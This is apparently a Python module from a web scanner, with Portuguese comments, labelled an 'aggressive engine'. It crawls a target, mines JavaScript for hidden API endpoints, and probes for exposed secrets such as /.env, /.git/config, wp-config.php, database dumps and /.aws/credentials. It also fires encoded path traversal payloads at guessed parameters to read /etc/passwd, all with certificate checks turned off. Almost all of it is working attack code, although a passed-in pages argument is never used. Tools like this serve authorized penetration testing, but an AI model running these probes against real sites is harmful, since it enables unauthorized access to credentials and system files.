"""
Pipeline 2 — Motor agressivo.
Roda crawler + extração de endpoints JS + testes de path traversal + leak hunting.
"""
import re
from core.utils import print_status, safe_request
from modules.aggressive.crawler import Crawler

# Endpoints comuns de APIs escondidos em JS
JS_ENDPOINT_PATTERN = re.compile(
    r'["\'](/(?:api|v\d|graphql|rest|endpoint|internal)[^\s"\'<>]{0,80})["\']'
)

TRAVERSAL_PAYLOADS = [
    "../../../../etc/passwd",
    "..%2F..%2F..%2Fetc%2Fpasswd",
    "....//....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
]

SENSITIVE_PATHS = [
    "/.env", "/.git/config", "/.git/HEAD", "/config.php",
    "/wp-config.php", "/backup.sql", "/dump.sql", "/.htaccess",
    "/server-status", "/phpinfo.php", "/info.php", "/debug",
    "/actuator", "/actuator/env", "/actuator/health",
    "/.aws/credentials", "/config.yml", "/config.yaml",
]


class AggressiveEngine:
    def __init__(self, target, context):
        self.target  = target
        self.context = context
        self.results = {
            "js_endpoints": [],
            "path_traversal": [],
            "sensitive_paths": [],
        }

    def extract_js_endpoints(self, pages):
        print_status("Extraindo endpoints ocultos de arquivos JS...", "INFO")
        seen = set()
        for page in pages:
            if ".js" not in page["url"]:
                continue
            for match in JS_ENDPOINT_PATTERN.findall(page["html"]):
                if match not in seen:
                    seen.add(match)
                    self.results["js_endpoints"].append(match)
                    self.context.add_url(self.target.rstrip("/") + match)
        print_status(f"{len(self.results['js_endpoints'])} endpoints JS encontrados.", "SUCCESS")

    def check_sensitive_paths(self):
        print_status("Verificando paths sensíveis expostos...", "WARN")
        for path in SENSITIVE_PATHS:
            url = self.target.rstrip("/") + path
            r = safe_request(url)
            if r and r.status_code == 200 and len(r.text) > 10:
                self.results["sensitive_paths"].append({
                    "url": url, "size": len(r.text),
                    "preview": r.text[:120].replace("\n"," "),
                    "severity": "CRITICAL"
                })
                self.context.add_finding({
                    "issue": f"Path sensível exposto: {path}",
                    "url": url, "severity": "CRITICAL",
                    "source": "AggressiveEngine"
                })
                print_status(f"PATH SENSÍVEL: {url}", "CRIT")

    def check_path_traversal(self, pages=None):
        print_status("Testando Path Traversal...", "WARN")
        import requests as req
        from urllib.parse import urlparse, parse_qs, urlunparse

        params = ["file","path","page","doc","template","load","read","include"]

        # Bug 1 fix: coleta URLs reais com params do crawler + URL base como fallback
        candidates = []
        if pages:
            for page in pages:
                parsed = urlparse(page["url"])
                if parsed.query:
                    real_params = list(parse_qs(parsed.query).keys())
                    base = urlunparse(parsed._replace(query="", fragment=""))
                    for p in real_params:
                        if p in params:
                            candidates.append((base, p))
        # Fallback: params genéricos na raiz
        for p in params:
            candidates.append((self.target, p))

        found = False
        for (url, param) in candidates:
            if found:
                break
            for payload in TRAVERSAL_PAYLOADS:
                try:
                    resp = req.get(url, params={param: payload}, timeout=6, verify=False,
                                   headers={"User-Agent": "Mozilla/5.0"})
                    if resp and "root:" in resp.text:
                        self.results["path_traversal"].append({
                            "param": param, "payload": payload,
                            "url": url, "severity": "CRITICAL",
                            "evidence": resp.text[:200]
                        })
                        self.context.add_finding({
                            "issue": "Path Traversal — /etc/passwd lido",
                            "url": url, "param": param,
                            "severity": "CRITICAL", "source": "AggressiveEngine"
                        })
                        print_status(f"PATH TRAVERSAL em param={param} ({url})", "CRIT")
                        found = True
                        break
                except Exception:
                    pass

    def run(self, pages):
        self.extract_js_endpoints(pages)
        self.check_sensitive_paths()
        self.check_path_traversal()
        return self.results


def run_aggressive(target, context):
    """Entrypoint Pipeline 2."""
    print_status("[PIPELINE 2] Motor Agressivo", "CRIT")
    crawler = Crawler(target, context=context)
    pages   = crawler.crawl()
    context.add_pages(pages)
    engine  = AggressiveEngine(target, context)
    return engine.run(pages)
